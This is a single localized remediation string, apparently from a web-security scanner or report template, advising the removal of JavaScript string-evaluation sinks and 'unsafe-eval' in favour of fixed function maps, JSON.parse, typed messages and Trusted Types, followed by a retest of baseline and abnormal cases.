mitigation.en: Remediation should remove string evaluation in favor of fixed function maps, JSON.parse, and typed messages; remove unsafe-eval and use Trusted Types or static analysis to prevent new sinks. Retest the normal baseline and minimized abnormal case in the same browser, policy, and input location to confirm required rendering, navigation, or resource loading remains available while execution, conditional requests, or object override evidence disappears.
